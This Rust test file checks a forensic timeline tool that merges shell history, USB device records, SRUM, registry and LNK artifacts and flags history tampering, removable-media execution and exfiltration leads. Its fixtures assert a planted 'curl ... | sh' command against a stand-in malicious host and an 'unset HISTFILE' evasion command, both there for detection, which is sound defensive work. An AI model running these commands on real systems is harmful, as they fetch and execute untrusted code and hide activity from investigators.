#![allow(clippy::unwrap_used, clippy::expect_used)]
//! End-to-end Doer-Checker validation over the **genuine published reader types**.
//!
//! The shell activities are derived from a real `.bash_history` file written by an
//! actual `bash` subshell (not a synthetic string) and decoded with the published
//! `shellhist_core::parse_auto`; the device is a real `peripheral_core::DeviceConnection`
//! shaped like a USB mass-storage stick. We assert that the timeline merges across
//! the two sources and that both v0.1 cross-source findings fire.
//!
//! The generator command for the history fixture is recorded in
//! `tests/data/README.md`.

use peripheral_core::{Bus, DeviceConnection, Provenance, Stamp};
use shellhist_core::parse_auto;
use useract_forensic::{
    audit, build_timeline, from_srum, Action, DeviceSource, LnkSource, RegistrySource,
    ShellHistorySource, SourceKind, SrumSource, Subject,
};

const REAL_BASH: &[u8] = include_bytes!("data/real_bash_history");

/// A USB mass-storage connection whose first-seen epoch lands inside the history's
/// command window (the genuine `bash` epochs are around 1.78e9).
fn usb_stick(first_install: i64, volume_serial: u32) -> DeviceConnection {
    DeviceConnection {
        bus: Bus::Usb,
        device_class_guid: None,
        vid: Some(0x0781),
        pid: Some(0x5583),
        device_serial: Some("1234567890AB".to_string()),
        serial_is_os_generated: false,
        friendly_name: None,
        device_instance_id: "USBSTOR\\Disk&Ven_SanDisk&Prod_Ultra\\1234567890AB".to_string(),
        first_install: Some(Stamp::authoritative(first_install)),
        last_install: None,
        last_arrival: None,
        last_removal: None,
        parent_id_prefix: None,
        volume_guid: None,
        drive_letter: None,
        volume_serial: Some(volume_serial),
        disk_signature: None,
        dma_capable: false,
        mitre: Vec::new(),
        source: Provenance {
            file: "setupapi.dev.log".to_string(),
            line: 1,
        },
    }
}

#[test]
fn real_history_parses_and_carries_timestamps() {
    let entries = parse_auto(REAL_BASH, Some(".bash_history"));
    assert!(!entries.is_empty(), "real history must yield entries");
    assert!(
        entries.iter().all(|e| e.timestamp.is_some()),
        "bash wrote #<epoch> lines, every entry should be timestamped"
    );
    assert!(
        entries
            .iter()
            .any(|e| e.command == "curl http://malicious.example/payload.sh | sh"),
        "the planted curl|sh command must be present"
    );
    assert!(
        entries.iter().any(|e| e.command == "unset HISTFILE"),
        "the planted history-clearing command must be present"
    );
}

#[test]
fn timeline_merges_real_shell_and_device_sources_in_time_order() {
    let entries = parse_auto(REAL_BASH, Some(".bash_history"));
    // Anchor the device connect to the curl|sh command's epoch so they share a window.
    let curl_ts = entries
        .iter()
        .find(|e| e.command.starts_with("curl "))
        .and_then(|e| e.timestamp)
        .expect("curl command must be timestamped");
    let device = [usb_stick(curl_ts, 0xDEAD_BEEF)];

    let shell = ShellHistorySource::new(&entries);
    let devices = DeviceSource::new(&device);
    let timeline = build_timeline(&[&shell, &devices]);

    // Both sources contributed.
    assert!(timeline
        .iter()
        .any(|a| a.source == SourceKind::ShellHistory));
    assert!(timeline
        .iter()
        .any(|a| a.source == SourceKind::PeripheralDevice));

    // Timestamps are non-decreasing across the merged timeline.
    let stamped: Vec<i64> = timeline.iter().filter_map(|a| a.timestamp).collect();
    assert!(
        stamped.windows(2).all(|w| w[0] <= w[1]),
        "merged timeline must be sorted by epoch: {stamped:?}"
    );

    // The device connection is present as a Connected activity carrying the volume serial.
    assert!(timeline.iter().any(|a| matches!(
        (&a.action, &a.subject),
        (
            Action::Connected,
            Subject::Device {
                volume_serial: Some(0xDEAD_BEEF),
                ..
            }
        )
    )));
}

#[test]
fn both_v01_cross_source_findings_fire_on_real_data() {
    let entries = parse_auto(REAL_BASH, Some(".bash_history"));
    let curl_ts = entries
        .iter()
        .find(|e| e.command.starts_with("curl "))
        .and_then(|e| e.timestamp)
        .expect("curl command must be timestamped");
    let device = [usb_stick(curl_ts, 0xDEAD_BEEF)];

    let shell = ShellHistorySource::new(&entries);
    let devices = DeviceSource::new(&device);
    let timeline = build_timeline(&[&shell, &devices]);
    let findings = audit(&timeline);

    let codes: Vec<&str> = findings.iter().map(|f| f.code.as_ref()).collect();
    assert!(
        codes.contains(&"USERACT-HISTORY-TAMPERED"),
        "history-clearing not surfaced; got {codes:?}"
    );
    assert!(
        codes.contains(&"USERACT-EXEC-DURING-REMOVABLE-MEDIA"),
        "exec-during-removable-media not surfaced; got {codes:?}"
    );

    // Doer-Checker: every finding is a hedged observation, never a verdict.
    for f in &findings {
        let note = f.note.to_ascii_lowercase();
        assert!(
            note.contains("consistent with"),
            "note must hedge: {}",
            f.note
        );
        assert!(
            !note.contains("proves") && !note.contains("confirms"),
            "verdict language: {}",
            f.note
        );
    }
}

// ── v0.2: SRUM + winreg-artifacts + LNK over the genuine published types ──────

fn utc(epoch: i64) -> chrono::DateTime<chrono::Utc> {
    chrono::DateTime::from_timestamp(epoch, 0).expect("valid epoch")
}

/// A genuine `lnk_core::ShellLink` for a file on a removable volume, built from the
/// real published struct (not synthetic bytes).
fn lnk_on_volume(path: &str, drive_serial: u32, write_time: i64) -> lnk_core::ShellLink {
    lnk_core::ShellLink {
        header: lnk_core::ShellLinkHeader {
            link_flags: 0,
            file_attributes: 0,
            creation_time: 0,
            access_time: 0,
            write_time,
            file_size: 0,
            icon_index: 0,
            show_command: 1,
            hotkey: 0,
        },
        link_target_idlist: None,
        link_info: Some(lnk_core::LinkInfo {
            volume_id: Some(lnk_core::VolumeId {
                drive_type: lnk_core::drive_type::REMOVABLE,
                drive_serial_number: drive_serial,
                volume_label: Some("KINGSTON".to_string()),
            }),
            local_base_path: Some(path.to_string()),
            common_network_relative_link: None,
        }),
        string_data: lnk_core::StringData::default(),
        tracker: None,
    }
}

#[test]
fn v02_sources_merge_join_fires_and_srum_is_actor_attributed() {
    // Shared volume serial across the LNK file and the connected USB stick.
    const SERIAL: u32 = 0xCAFE_F00D;
    const SID: &str = "S-1-5-21-1111-2222-3333-1001";

    // SRUM network row attributed to a user SID, resolved through the id-map.
    let id_map = [
        srum_core::IdMapEntry {
            id: 7,
            name: SID.to_string(),
        },
        srum_core::IdMapEntry {
            id: 42,
            name: "C:\\Tools\\rclone.exe".to_string(),
        },
    ];
    let net = [srum_core::NetworkUsageRecord {
        app_id: 42,
        user_id: 7,
        timestamp: utc(1_700_000_100),
        bytes_sent: 4096,
        bytes_recv: 1024,
        auto_inc_id: 0,
    }];

    // A UserAssist entry (genuine winreg-artifacts type).
    let userassist = [winreg_artifacts::userassist::UserAssistEntry {
        program: "C:\\Tools\\rclone.exe".to_string(),
        run_count: 3,
        focus_count: 0,
        focus_duration_ms: 0,
        last_run: Some("2023-11-14T22:13:40Z".to_string()),
        guid: "{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}".to_string(),
    }];

    // An LNK file opened from the removable volume.
    let links = [lnk_on_volume("E:\\loot.zip", SERIAL, 1_700_000_200)];

    // The peripheral device connected with the SAME volume serial.
    let device = [usb_stick(1_700_000_050, SERIAL)];

    let srum = SrumSource::new(&net, &[], &id_map);
    let registry = RegistrySource::new(&userassist, &[], &[], Some(SID));
    let lnk = LnkSource::new(&links, Some(SID));
    let devices = DeviceSource::new(&device);
    let timeline = build_timeline(&[&srum, &registry, &lnk, &devices]);

    // All four sources contributed.
    for kind in [
        SourceKind::Srum,
        SourceKind::Registry,
        SourceKind::LnkFile,
        SourceKind::PeripheralDevice,
    ] {
        assert!(
            timeline.iter().any(|a| a.source == kind),
            "source {kind:?} missing from merged timeline"
        );
    }

    // The merged timeline is in epoch order.
    let stamped: Vec<i64> = timeline.iter().filter_map(|a| a.timestamp).collect();
    assert!(
        stamped.windows(2).all(|w| w[0] <= w[1]),
        "merged timeline must be sorted by epoch: {stamped:?}"
    );

    // SRUM activity is actor-attributed to the user SID.
    let srum_act = timeline
        .iter()
        .find(|a| a.source == SourceKind::Srum)
        .expect("SRUM activity present");
    assert_eq!(
        srum_act.actor.as_deref(),
        Some(SID),
        "SRUM must attribute to a SID"
    );
    assert_eq!(srum_act.action, Action::Executed);

    // The LNK file carries the structured volume serial.
    assert!(timeline.iter().any(|a| matches!(
        &a.subject,
        Subject::File {
            volume_serial: Some(s),
            ..
        } if *s == SERIAL
    )));

    // The volume-serial join fires across LNK and peripheral sources.
    let findings = audit(&timeline);
    let codes: Vec<&str> = findings.iter().map(|f| f.code.as_ref()).collect();
    assert!(
        codes.contains(&"USERACT-FILE-ON-EXTERNAL-DEVICE"),
        "volume-serial join must fire; got {codes:?}"
    );

    // Every finding remains a hedged observation, never a verdict.
    for f in &findings {
        let note = f.note.to_ascii_lowercase();
        assert!(
            note.contains("consistent with"),
            "note must hedge: {}",
            f.note
        );
        assert!(
            !note.contains("proves") && !note.contains("confirms"),
            "verdict language: {}",
            f.note
        );
    }
}

#[test]
fn srum_network_exfil_volume_surfaces_as_a_graded_lead() {
    use useract_forensic::NETWORK_EXFIL_BYTES_THRESHOLD;

    let id_map = [
        srum_core::IdMapEntry {
            id: 1,
            name: "S-1-5-21-1111-2222-3333-1002".to_string(),
        },
        srum_core::IdMapEntry {
            id: 2,
            name: "C:\\Tools\\rclone.exe".to_string(),
        },
    ];
    let net = [srum_core::NetworkUsageRecord {
        app_id: 2,
        user_id: 1,
        timestamp: utc(1_700_000_300),
        bytes_sent: NETWORK_EXFIL_BYTES_THRESHOLD + 1,
        bytes_recv: 0,
        auto_inc_id: 0,
    }];
    let acts = from_srum(&net, &[], &id_map);
    let findings = audit(&acts);
    let f = findings
        .iter()
        .find(|f| f.code == "USERACT-NETWORK-EXFIL-VOLUME")
        .expect("network-exfil-volume must surface above threshold");
    // It is a hedged lead, not a verdict.
    let note = f.note.to_ascii_lowercase();
    assert!(note.contains("consistent with"));
    assert!(note.contains("lead"));
    assert!(!note.contains("proves") && !note.contains("confirms"));
}
